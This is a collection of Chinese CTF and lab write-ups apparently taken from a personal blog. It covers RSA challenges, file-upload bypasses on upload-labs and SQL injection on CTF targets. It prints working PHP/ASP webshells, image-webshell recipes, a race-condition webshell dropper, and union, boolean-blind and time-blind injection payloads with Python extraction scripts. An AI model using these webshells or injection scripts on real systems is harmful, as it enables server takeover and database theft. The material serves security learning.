五、RSA实战Crypto1：easy_RSA题目提示是RSA，下载题目查看由题目可知，只要计算出私钥d即可φ(N)=φ(p)φ(q)=(p-1)(q-1)ed ≡ 1 (mod φ(N))所以ed=φ(N)+1，即17d=(p-1)(q-1)+1=473398607160*4511490+1先计算欧拉函数φ(N)再加1然后除以17即是私钥d，也即是flag内容，加上flag{}提交 百度发现一个脚本，不过要安装gmpy2库 #!/usr/bin/env python3 # -*- coding:utf-8 -*- import gmpy2 p = 473398607161 q = 4511491 e = 17 s = (p-1)*(q-1) d = gmpy2.invert(e,s) print(&#39;flag is :&#39;,d) Crypto2：Normal_RSA下载题目，得到flag.enc和pubkey.pem。根据题目提示肯定是需要用到工具。RSA工具及使用这道题目主要需要用到RSAtools和OpenSSL1、用OpenSSL得到N命令： openssl rsa -pubin -text -modulus -in public.pemN=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDModulus 是N的值，Exponent是e的值。16进制转10进制2、分解N的值，得到p、q在线大数分解即p=275127860351348928173285174381581152299、q=319576316814478949870590164193048041239 3、用RSAtools生成私钥文件private.pem命令： python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 3195763168144789498705901641930480412394、用生成的private.pem和OpenSSL对flag.enc文件进行解密命令： openssl rsautl -decrypt -in flag.enc -inkey private.pem得到flag 感悟学习了RSA加密算法之后，对RSA加密解密有了认识。同时为了能顺利使用rsatool，特意又搭了Kali虚拟机。果然Kali真的是强大的一批。小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://qwzf.github.io/tags/RSA/"}],"author":"qwzf"},{"title":"文件上传漏洞 学习笔记(二)","slug":"文件上传漏洞 学习笔记(二)","date":"2019-08-03T02:22:22.464Z","updated":"2020-08-01T16:39:36.906Z","comments":true,"path":"2019/08/03/文件上传漏洞 学习笔记(二)/","link":"","permalink":"https://qwzf.github.io/2019/08/03/文件上传漏洞 学习笔记(二)/","excerpt":"","text":"前言之前已经总结了一部分文件上传漏洞，现在继续总结剩余的另一部分。 正文漏洞环境依旧用的upload-labs。 四、白名单限制文件上传文件截断绕过%00截断类型：PHP %00截断原理：因为00代表结束符，所以会把00后面的所有字符删除条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态常见的截断上传0x00，%00，/00 截断的核心在于chr(0)这个字符，这个函数表示返回以数值表达式值为编码的字符。char(0)表示的ascll字符是null，当程序输出包含chr(0)变量时，chr(0)后面的数据会被截断，后面的数据直接忽略，导致漏洞产生。 Pass-11查看源码 $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 是白名单判断，但$img_path直接拼接，所以可以利用%00截断绕过，上传webshell。因为我的ubantu虚拟机PHP版本大于5.3.4，所以直接在windows进行测试。因为之前没用过，所以先配置一下：1、Firefox+Burpsuite抓包配置2、设置PHP版本3、magic_quotes_gpc调为OFF：magic_quotes_gpc函数的关闭方法 配置结束，开始上传webshell.jpg，抓包，添加webshell.php%00Forward发包，上传成功测试连接，连接成功 Pass-12查看源码，还是白名单判断，还是利用00截断。但save_path是通过post传进来的，post不会像get对%00进行自动解码，所以需要在二进制中进行修改。空格的十六进制是20 ，将0x20 改成0x00 也就是00点击Go，上传成功测试连接，连接成功 五、内容限制文件上传Pass-13要求上传图片马，查看源码 function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType = &#39;&#39;; switch($typeCode){ case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type = getReailFileType($temp_file); if($file_type == &#39;unknown&#39;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } 分析代码，通过读文件的前2个字节判断文件类型，因此直接上传图片马即可， 图片马制作方法方法一：copy normal.jpg /b + shell.php /a webshell.jpg这里，b代表二进制，a代表ascii编码方法二：exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; 1.jpg 我采用方法一先制作个图片马webshell.jpg(为了方便以后关卡一般直尝试jpg图片马)上传webshell.jpg，不用抓包改包，上传成功测试连接，连接失败，发现文件名被替换。一般使用BurpSuite的Repeater进行发包上传，方便查看被修改后的文件名。这里我用的本地搭建的环境，直接查看就行了。重新输入图片马的文件名，测试连接，连接成功。表示该图片上传成功，但并不意味者可以进行利用利用的话，还需要结合文件包含漏洞。这个靶场环境自带了个文件包含文件内容如下： &lt;?php /* 本页面存在文件包含漏洞，用于测试图片马是否能正常运行！ */ header(&quot;Content-Type:text/html;charset=utf-8&quot;); $file = $_GET[&#39;file&#39;]; if(isset($file)){ include $file; }else{ show_source(__file__); } ?&gt; 在php中，使用include,require、include_once、require_once函数包含的文件，会被当做php代码执行。无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。列出目录 Pass-14依旧是上传图片马，查看源码 function isImage($filename){ $types = &#39;.jpeg|.png|.gif&#39;; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; } } 这里用的是getimagesize获取文件类型，还是直接可以利用图片马就可以绕过。还用Pass-13制作的那个图片马，上传成功，连接成功。利用的话，结合文件包含漏洞。 当然查看有关信息发现可以图片头绕过，具体操作如下：将PHP木马文件，改成*.php;.jpg抓包，给文件头部加上：GIF89a 图片头标识 Pass-15查看源码 function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; } } 利用php_exif模块判断文件类型，还是直接利用图片马就可以绕过。上传图片马，在windows上上传有问题。所以打开ubantu漏洞环境上传，上传成功查看文件名测试连接，连接成功。利用的话，结合文件包含漏洞。 Pass-16依旧是上传图片马，上传、查看文件名(正常情况下是用代理工具(如：BurpSuite)查看文件名)测试连接、连接成功。利用的话，结合文件包含漏洞。不过查看源码发现，综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，绕过方法(不想尝试，这里借用大佬的一张图)： 六、竞争条件攻击竞争条件攻击存在的原因：一些网站上传逻辑是先允许上传任意文件，然后检查上传文件是否包含WebShell脚本，如果包含则删除该文件。文件上传成功后和删除文件之间存在短的时间差。攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。攻击过程：攻击者先上传一个webshell脚本shell.php，shell.php的内容是生成一个新的webshell脚本webshell.phpshell.php代码如下： &lt;?php fputs(fopen(&#39;../webshell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39;); ?&gt; shell.php上传成功后，客户端立即访问shell.php，则会在当前目录下自动生成webshell.php，这时攻击者就利用时间差完成webshell的上传。 Pass-17查看源码 $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传出错！&#39;; } } 这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。首先在burp中不断发送上传webshell的数据包，然后不断在浏览器中访问，发现通过竞争可以访问到。(不会不断发送上传webshell的数据包，没有复现成功)upload-labs17 Pass-18本关需要上传图片马，查看代码发现：对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 依旧用webshell.jpg图片马测试，发送上传图片马的数据包 CVE-2015-2348 move_uploaded_file() 00截断Pass-19考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的查看源码，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过。上传的文件名用0x00绕过。改成*.php【二进制00】.1.jpg，上传文件名改成要自己定义。也可以上传webshell.php/.绕过下面用的windows的漏洞环境。两个文件名中间留一个空格将0x20改为0x00Forword发包，上传成功。测试连接，连接成功 感悟好了，总结完毕，总算了解完文件上传漏洞的各种绕过姿势，收获很大。继续努力，小白进阶ing。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"文件上传漏洞","slug":"漏洞原理/文件上传漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/文件上传漏洞/"}],"tags":[{"name":"白名单绕过","slug":"白名单绕过","permalink":"https://qwzf.github.io/tags/白名单绕过/"},{"name":"内容绕过","slug":"内容绕过","permalink":"https://qwzf.github.io/tags/内容绕过/"},{"name":"竞争条件绕过","slug":"竞争条件绕过","permalink":"https://qwzf.github.io/tags/竞争条件绕过/"}],"author":"qwzf"},{"title":"CTF做题总结(二)","slug":"CTF做题总结(二)","date":"2019-08-02T03:22:58.388Z","updated":"2020-03-18T02:49:55.044Z","comments":true,"path":"2019/08/02/CTF做题总结(二)/","link":"","permalink":"https://qwzf.github.io/2019/08/02/CTF做题总结(二)/","excerpt":"","text":"前言最近这段时间在内部平台上做了一些Web题，和最基础的Reverse签到题。虽说还有两道Reverse题没做出来，但还是先总结一下吧！ Web1：BASE-INJECT看题目提示，就知道这道题之前做过，不过当时没总结，现在总结一下。题目的意思是注入。点开题目发现输入id可以查信息，并且是get传参方式。判断是否存在sql注入判断方法在sqlilabs攻关总结中总结过。就不叙述了。这里我选用get单引号判断输入?id=1显示正常输入?id=1’显示错误，所以存在sql注入并且有显示位，所以应该是SQL注入-联合查询注入。 联合查询注入前提要用联合查询进行注入则：页面必须有显示位显示位(查字段)在一个网站的正常页面，服务器执行sql语句查询数据库中的数据，客户端将数据展示在页面中，这个暂时数据的位置就是显示位。联合查询union可合并两个或多个select语句的结果集，如： select id,username,password from users where id=1 union select 1,2,3; 前提是两个select必有相同列、且各列的数据类型也相同union注入条件只有最后一个select子句允许有order by只有最后一个select子句允许有limit只要union连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果注入点页面有回显注入步骤 判断是整型还是字符型 判断查询列数 判断显示位 获取所有数据库名 获取数据库所有表名 获取字段名 获取字段中的数据 知识了解完毕，开始解题1.判断是整型还是字符型输入?id=1 and 1=1输入?id=1 and 1=2回显页面不同，说明是整型注入2.判断查询列数输入?id=1 order by 3 --+ 显示正常再次输入?id=1 order by 4 --+ 显示错误所以在?id=1查看的这个表有3列，即3个字段 3. 判断显示位1、2、3处，即是显示位。 4. 获取所有数据库名group_concat()一次性显示： 1 union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+ 显示当前数据库： database() 1 union select 1,2,database()--+ 5. 获取数据库所有表名 1 union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES WHERE TABLE_SCHEMA=database() --+ 6. 获取字段名 1 union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_SCHEMA=database() and TABLE_NAME=&#39;users&#39; --+ 7. 获取字段中的数据 1 union select 1,2,group_concat(username) from users --+ 得到flag。 Web2：BASE-Blind-Inject“BASE-Blind-Inject”意思是“基础盲注”。盲注知识之前我已经总结过，所以直接做题打开题目，发现是登录框。想到SQL的简单注入，试一下闭合方式，最后发现是双引号闭合payload &quot; or 1=1# flag在数据库？！并且输错回显不同，再结合题目“基础盲注”，所以很明显是布尔盲注，并且是POST型的。所以开始构造针对此题的布尔盲注pyload盲注方法： 最慢：可以采用二分法的方式，手工进行盲注，对数据库名的每一个字符进行猜解(在浏览器进行测试有点不方便，可以用Burpsuite抓包，使用Repeater进行测试)参考：sqli-labs攻关2(布尔盲注、时间盲注) 一般：可以使用Burpsuite抓包，半自动化盲注，设置变量，通过返回的长度不同进行判断参考：利用BurpSuite实现半自动化盲注 较快：写一个普通盲注脚本进行盲注参考：sqli-labs盲注脚本python3以post方式提交数据 最快:写一个2分法猜测数据库长度的盲注脚本进行盲注参考：Bool盲注脚本-POST 1.爆库猜库长payload &quot; or (length(database())=10)--+正常 所以数据库长度为10猜库名payload &quot; or (ascii(substr(database(),1,1))=n)--+ 手工盲注手工测试第一个字符第一个字符ascii码为99，即字符“c”一直尝试，直到字符全部猜出。 Burpsuite半自动化盲注要注意如果第二个变量选择的是字符字典，payload写成如下形式： &quot; or (substr(database(),1,1)=&#39;a&#39;)--+ length为498的即为正常回显的，(上面等进度条满格则爆破结束，我没有爆破完)将得到的正常回显的Payload2根据Payload1进行排序，即为数据库名。数据库名为chellenges2.爆表猜表长payload &quot; or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6)--+正常 所以数据表长度为6猜表名payload &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=n)--+ 沿用爆库的方法，最终得到表名user_23.爆字段猜字段长payload &quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1))=2)--+正常 &quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1))=8)--+正常 &quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 2,1))=8)--+正常 所以数据字段长度分别为2、8、8猜字段名payload &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))=n)--+ 沿用爆库的方法，最终得到三个字段名id username password4.爆数据猜数据长 &quot; or (length((select password from challenges.user_2 limit 1,1))=32)--+正常 所以数据长度为32，这个应该就是flag那条数据了猜数据名 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))=n)--+ 沿用爆库的方法，最终得到数据flag 脚本盲注这里有一个我参照大佬博客写好的脚本(我太菜，不会写二分法猜长度的那个脚本) import requests chars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39; postdata={ &#39;username&#39;:&#39;&quot; or 1=1#&#39;, &#39;password&#39;:&#39;admin&#39; } url=&quot;http://35.201.188.231:9000/challenge-02/post.php&quot; r=requests.post(url,data=postdata) length=len(r.text) def name(url,length): dbname=&#39;&#39; print(&quot;数据库名：&quot;,dbname) payload=&#39;&quot; or ascii(substr(database(),{0},1))={1} #&#39; #print(&quot;数据表名：&quot;,dbname) #payload=&#39;&quot;or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}#&#39; #print(&quot;字段名：&quot;,dbname) #payload=&#39;&quot;or ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1),{0},1))={1}#&#39; #print(&quot;数据：&quot;,dbname) #payload=&#39;&quot; or ascii(substr((select password from user_2 limit 1,1),{0},1))={1}#&#39; for i in range(1,40): char=&#39;&#39; for x in chars: char_ascii=ord(x) payloads=payload.format(i,char_ascii) postdata={ &#39;username&#39;:payloads, &#39;password&#39;:&#39;admin&#39; } r=requests.post(url,data=postdata) if len(r.text) == length: dbname+=x print(dbname) char=x break if char==&#39;&#39;: break return dbname name(url,length) Web3：BASE-TIME-BLIND-INJECT题目意思是时间盲注，所以很显然这道题是时间盲注。时间盲注正常和不正常回显结果相同，所以进入题目，还是登录框，先不测试。查看源码给了题目源码，url框输入www.zip下载源码，或如下解压，查看发现sql查询语句的闭合方式，所以构造闭合方式为&#39;&quot;当然时间盲注也有三种方法： 手工盲注： sqli-labs攻关2(布尔盲注、时间盲注) Burpsuite半自动化盲注：Mysql 高级盲注技巧之时间盲注 脚本盲注：Time盲注脚本-POST 与布尔盲注相比，因为正常和不正常返回相同，所以采用sleep()函数延迟时间来判断是否正常。1.爆库猜库长 &#39;&quot; or if(length(database())=10,sleep(5),1)--+延迟五秒 所以数据库长度为10猜库名 &#39;&quot; or if((ascii(substr(database(),1,1))=n),sleep(5),1)--+ 手工盲注手工测试第一个字符第一个字符ascii码为98时，无延迟；第一个字符ascii码为99时，延迟5秒。所以第一个字符为99，即字符“c” Burpsuite半自动化盲注要注意如果第二个变量选择的是字符字典，大小写识别有点问题，不过因为字典较快，所以依旧用的字典，然后再判断大小写。payload写成如下形式： &#39;&quot; or if((substr(database(),1,1)=&#39;a&#39;),sleep(5),1)--+ 和布尔盲注一样选择设置变量，选择变量范围。开始爆破，双击Timeout下的四方块正常的延迟的找到所有延迟的，然后进行排序即可得到数据库名。最后得到数据库名为chellenges2.爆表猜表长 &#39;&quot; or if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6),sleep(5),1)--+延迟5秒 所以数据表长度为6猜表名 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=n),sleep(5),1)--+ 沿用爆库的方法，最终得到表名user_33.爆字段猜字段长 &#39;\\&quot; or if((length((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 0,1))=2),sleep(5),1)--+延迟5秒 &#39;\\&quot; or if((length((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 1,1))=8),sleep(5),1)--+延迟5秒 &#39;\\&quot; or if((length((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 2,1))=8),sleep(5),1)--+延迟5秒 所以数据字段长度分别为2、8、8猜字段名 &#39;\\&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&quot;user_3&quot; and table_schema=database() limit 0,1),1,1))=n),sleep(5),1)--+ 沿用爆库的方法，最终得到三个字段名id username password4.爆数据 猜数据长 &quot; or if((length((select password from challenges.user_3 limit 1,1))=25),sleep(5),1)--+延迟5秒 所以数据长度为25，这个应该就是flag那条数据了 猜数据名 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))=n),1,sleep(5))--+ 沿用爆库的方法，最终得到数据flag 脚本盲注这里有一个我修改布尔盲注得到的时间盲注脚本 import requests import time import string import sys chars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39; url=&quot;http://35.201.188.231:9000/challenge-02/post.php&quot; dbname=&#39;&#39; payload=&quot;&#39;\\&quot; or if((ascii(substr(database(),{0},1))={1}),sleep(5),1) #&quot; print(&quot;数据库名：&quot;,dbname) #payload=&quot;&#39;\\&quot;or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}),sleep(5),1) #&quot; #print(&quot;数据表名：&quot;,dbname) #payload=&quot;&#39;\\&quot;or if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;user_3&quot; limit 1,1),{0},1))={1}),sleep(5),1) #&quot; #print(&quot;字段名：&quot;,dbname) #payload=&quot;&#39;\\&quot; or if((ascii(substr((select password from user_3 limit 1,1),{0},1))={1}),sleep(5),1) #&quot; #print(&quot;数据：&quot;,dbname) for i in range(1,40): char=&#39;&#39; for x in chars: char_ascii=ord(x) payloads=payload.format(i,char_ascii) start=time.time() postdata={ &#39;username&#39;:payloads, &#39;password&#39;:&#39;admin&#39; } r=requests.post(url,data=postdata) if (time.time() - start)&gt;=5: dbname+=x print(dbname) char=x break if char==&#39;&#39;: break 因为效率有点低，就先演示个爆数据库名的 Web4：BASE-INJECT-WAF根据和查看题目，与Web1相比就多加了个waf。通过preg_replace()函数执行一个正则表达式的搜索和替换。由题目可知，过滤了or|and|select|union|from，所以要进行WAF绕过 WAF绕过参考博客：SQL注入WAF绕过姿势这道题我采用的双写绕过1.爆库2.爆表3.爆字段4.爆数据得到flag。 Web5：orderby死亡在线order by？！我只知道查列数有用到order by。先看看老学长给的tips先百度一下order byORDER BY 关键字 order by排序注入Order by排序注入方法小总结MySQL Order By 注入总结了解完毕。这是order by排序注入，如下order参数可控： select * from goods order by $_GET[&#39;order&#39;] 而题目tips刚好符合： select * from 一个不是flag的表 order by id {$order} 我选择利用报错返回多条记录的方式进行注入，先进行测试post传参 order=and if(1=1,1,(select 1 from information_schema.tables))正确 order=and if(1=2,1,(select 1 from information_schema.tables))错误 所以构造payload开始报错盲注1.爆库payload and if(ascii(substr(database(),1,1))=n,1,(select 1 from information_schema.tables)) 2.爆表payload and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=n,1,(select 1 from information_schema.tables)) 3.爆字段payload and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;cha1users&#39; and table_schema=&#39;cha1DB&#39; limit 3,1),1,1))=n,1,(select 1 from information_schema.tables)) 4.爆数据payload and if(ascii(substr((select flag from cha1users limit 1,1),1,1))=n,1,(select 1 from information_schema.tables)) 除payload不同外，方法沿用布尔盲注。这有一个我改好的脚本： import requests chars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+!@%^*$()[]:&quot;.#&#39; postdata={ &#39;order&#39;:&#39;,if(1=1,1,(select 1 from information_schema.tables))&#39; } url=&quot;http://39.106.19.10/orderby/&quot; r=requests.post(url,data=postdata) length=len(r.text) def name(url,length): dbname=&#39;&#39; payload=&#39;and if(ascii(substr(database(),{0},1))={1},1,(select 1 from information_schema.tables))&#39; print(&quot;数据库为：&quot;,dbname) #payload=&#39;and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1},1,(select 1 from information_schema.tables))&#39; #print(&quot;数据表为：&quot;,dbname) #payload=&quot;and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;cha1users&#39; and table_schema=&#39;cha1DB&#39; limit 3,1),{0},1))={1},1,(select 1 from information_schema.tables))&quot; #print(&quot;字段为：&quot;,dbname) #payload=&quot;and if(ascii(substr((select flag from cha1users limit 1,1),{0},1))={1},1,(select 1 from information_schema.tables))&quot; #print(&quot;数据：&quot;,dbname) for i in range(1,40): char=&#39;&#39; for x in chars: char_ascii=ord(x) payloads=payload.format(i,char_ascii) postdata={ &#39;order&#39;:payloads } r=requests.post(url,data=postdata) if len(r.text) == length: dbname+=x print(dbname) char=x break if char==&#39;&#39;: break return dbname name(url,length) Reverse1：RE0(签到)就是一个很简单的签到题，赢了就有flag？！所以用IDA打开，选择打开得到flag Reverse2：RE1提示的很明显(之前好像没提示有莫名奇妙的数字)，下载题目用IDA打开，F5反编译一下发现一串奇怪的数字，按照v4-v23对下面的数字进行排序，然后转换成ASCII(之前我不知道可以用r键转，所以用的在线平台)得到flag。 感悟总结之后对联合查询和盲注有了更加清醒的认识，同时会脚本的编写和改写也特别重要。继续努力，小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"Reverse","slug":"Reverse","permalink":"https://qwzf.github.io/tags/Reverse/"},{"name":"SQL","slug":"SQL","permalink":"https://qwzf.github.io/tags/SQL/"},{"name":"盲注","slug":"盲注","permalink":"https://qwzf.github.io/tags/盲注/"}],"author":"qwzf"},{"title":"文件上传漏洞 学习笔记(一)","slug":"文件上传漏洞 学习笔记(一)","date":"2019-07-31T15:01:05.126Z","updated":"2020-08-01T16:38:09.254Z","comments":true,"path":"2019/07/31/文件上传漏洞 学习笔记(一)/","link":"","permalink":"https://qwzf.github.io/2019/07/31/文件上传漏洞 学习笔记(一)/","excerpt":"","text":"前言学习进行时，最近我学习了文件上传漏洞，感觉收获很大，所以总结一下。 为什么存在文件上传漏洞上传文件时，Web应用程序没有对上传文件的格式进行严格过滤 , 就容易造成可以上传任意文件的情况。还有一部分是攻击者通过 Web服务器的解析漏洞来突破Web应用程序的防护。 危害上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞，攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器，这个恶意脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门。WebShell具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。 文件上传漏洞环境upload-labs：https://github.com/c0ny1/upload-labs皮卡丘：https://github.com/zhuifengshaonianhanlu/pikachuDoraBox：https://github.com/gh0stkey/DoraBox 正文为了方便，我直接把漏洞环境部署到ubantu虚拟机了。 一、任意文件上传DoraBox漏洞环境没有进行任何过滤，可以上传任意文件所以直接上传webshell(当然webshell有asp、aspx、php类型。我使用的是php)asp &lt;%eval request(“xxx”)%&gt; aspx &lt;%@ Page Languag=”xxx”%&gt; &lt;%eval(Request.Item[“xxx”])%&gt; php &lt;?php @eval($_POST[&#39;a&#39;]) ?&gt; 使用菜刀或蚁剑连一下，我用的蚁剑可以查看服务器文件和目录了下面的绕过类型都是通过的upload-labs漏洞环境来实现 二、JS限制文件上传Pass-01直接上传webshell，发现上传失败，只能上传后缀为.jpg|.png|.gif的文件。查看源码 function checkFile() { var file = document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } } 在客户端使用JS对不合法图片进行检查。所以绕过客户端JS检测，上传webshell客户端JS检测JS检测绕过上传漏洞，如果上传后缀不被允许，则会弹窗告知。上传文件的数据包没有发到服务端，只在客户端使用JavaScript对数据包进行检测。绕过客户端JS检测的三种方法 使用浏览器插件。删除检测文件后缀的JS代码，然后上传webshell 首先把webshell的后缀改成允许上传的.jpg|.png|.gif，绕过JS检测。再抓包，把后缀名改成.php,即可上传webshell 在前端js判断函数中加上可以上传php文件 尝试第二种，先把webshell的后缀.php改为.jpg然后上传，抓包修改后缀为.phpForward发包，上传成功测试连接，连接成功注意：测试完后删除webshell.php，因为后边我使用的都是同一个webshell(不是同一个，就不用删除) 二、MIME限制文件上传Pass-02直接上传webshell，发现上传失败，文件类型不正确。查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;文件类型不正确，请重新上传！&#39;; } } else { $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;; } } 在服务端对数据包的MIME进行检查。所以绕过文件类型，上传webshellMIMEMIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。绕过服务端对数据包的MIME进行检查在客户端上传文件，通过BurpSuite抓包。 上传php文件时，Content-Type的值是application/octet-stream； 